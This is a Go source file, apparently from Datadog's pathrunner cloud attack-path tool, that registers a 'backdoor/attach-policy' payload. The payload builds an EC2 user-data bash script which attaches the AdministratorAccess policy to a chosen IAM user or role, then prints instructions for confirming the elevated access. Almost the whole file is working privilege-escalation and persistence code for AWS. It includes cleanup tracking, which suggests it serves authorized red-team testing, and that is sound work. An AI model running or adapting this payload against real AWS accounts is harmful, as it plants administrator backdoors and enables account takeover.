// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package ec2

import (
	"encoding/json"
	"fmt"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"
)

type BackdoorAttachPolicyPayload struct{}

func NewBackdoorAttachPolicyPayload() *BackdoorAttachPolicyPayload {
	return &BackdoorAttachPolicyPayload{}
}

func init() {
	payloads.Register(NewBackdoorAttachPolicyPayload())
}

func (p *BackdoorAttachPolicyPayload) GetName() string {
	return "backdoor/attach-policy"
}

func (p *BackdoorAttachPolicyPayload) GetDescription() string {
	return "Attach AdministratorAccess policy to an IAM user or role via EC2 user-data"
}

func (p *BackdoorAttachPolicyPayload) GetTags() []string {
	return []string{
		payloads.TagServiceEC2,
		payloads.TagLanguageBash,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_ARN",
			Description: "IAM user or role name/ARN to attach policy to (auto-detects type from ARN, tries both if plain name)",
			Required:    true,
		},
		{
			Name:        "POLICY_ARN",
			Description: "ARN of policy to attach (default: AdministratorAccess)",
			Required:    false,
			Default:     "arn:aws:iam::aws:policy/AdministratorAccess",
		},
	}
}

func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (string, error) {
	targetARN := options["TARGET_ARN"]
	principalName, principalType := parsePrincipalARN(targetARN)
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	// For EC2 user-data we generate bash -- build the attach command based on detected type.
	// If we can't determine the type from the ARN (plain name), try user first then role.
	var attachCommand string
	switch principalType {
	case "role":
		attachCommand = fmt.Sprintf("aws iam attach-role-policy --role-name %s --policy-arn %s", principalName, policyArn)
	case "user":
		attachCommand = fmt.Sprintf("aws iam attach-user-policy --user-name %s --policy-arn %s", principalName, policyArn)
	default:
		// Plain name -- try user, fall back to role
		attachCommand = fmt.Sprintf(`aws iam attach-user-policy --user-name %s --policy-arn %s 2>/dev/null || \
    aws iam attach-role-policy --role-name %s --policy-arn %s`, principalName, policyArn, principalName, policyArn)
	}

	userDataScript := fmt.Sprintf(`#!/bin/bash
exec > >(tee /var/log/pathrunner-elevation.log|logger -t pathrunner -s 2>/dev/console) 2>&1

echo "Pathrunner Attach Policy Payload"
echo "Target: %s"
echo "Policy: %s"
echo ""

# Wait for instance role to be fully available
echo "Waiting for IAM role to be available..."
sleep 10

# Attach policy to target principal
echo "Attaching policy to %s..."
%s

if [ $? -eq 0 ]; then
    echo "SUCCESS: Policy attached to %s"
    echo "Target principal now has elevated permissions"
else
    echo "FAILED: Could not attach policy (exit code: $?)"
fi

echo "Elevation attempt complete"
`, principalName, policyArn, principalName, attachCommand, principalName)

	return userDataScript, nil
}

// parsePrincipalARN extracts the principal name and type from an ARN or plain name.
func parsePrincipalARN(input string) (name string, principalType string) {
	if strings.HasPrefix(input, "arn:") {
		if idx := strings.Index(input, ":role/"); idx != -1 {
			return input[idx+len(":role/"):], "role"
		}
		if idx := strings.Index(input, ":user/"); idx != -1 {
			return input[idx+len(":user/"):], "user"
		}
	}
	return input, ""
}

func (p *BackdoorAttachPolicyPayload) ProcessResult(result string) (string, error) {
	// For EC2 user-data payloads, result is typically instance metadata
	var instanceData map[string]interface{}
	if err := json.Unmarshal([]byte(result), &instanceData); err != nil {
		// If not JSON, return as-is
		return result, nil
	}

	var output strings.Builder
	output.WriteString("=== Attach Policy Payload Results ===\n\n")

	if instanceID, ok := instanceData["instance_id"].(string); ok {
		output.WriteString("Instance ID: " + instanceID + "\n")
	}

	if state, ok := instanceData["state"].(string); ok {
		output.WriteString("Instance State: " + state + "\n")
	}

	output.WriteString("\nUser-Data Script Status:\n")
	output.WriteString("The elevation script is executing on the EC2 instance.\n")
	output.WriteString("It will attempt to attach the policy to the target principal.\n\n")

	output.WriteString("To verify elevation:\n")
	output.WriteString("1. Wait 2-3 minutes for the script to complete\n")
	output.WriteString("2. Check if the policy was attached to your principal\n")
	output.WriteString("3. Test admin access with: aws iam list-users\n\n")

	output.WriteString("To check script logs:\n")
	output.WriteString("aws ec2 get-console-output --instance-id <INSTANCE_ID>\n")

	return output.String(), nil
}

// ReportSideEffects returns the policy attachment as a tracked modification.
func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	principalName, principalType := parsePrincipalARN(options["TARGET_ARN"])
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	cleanupMethod := "iam:DetachUserPolicy"
	if principalType == "role" {
		cleanupMethod = "iam:DetachRolePolicy"
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:attached-policy",
			Name:          fmt.Sprintf("%s←%s", principalName, "AdministratorAccess"),
			ARN:           policyArn,
			CleanupMethod: cleanupMethod,
			Metadata: map[string]string{
				"principal_type": principalType,
				"principal_name": principalName,
				"policy_arn":     policyArn,
			},
		},
	}
}

func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error {
	if options["TARGET_ARN"] == "" {
		return fmt.Errorf("TARGET_ARN is required for backdoor/attach-policy payload")
	}
	return nil
}
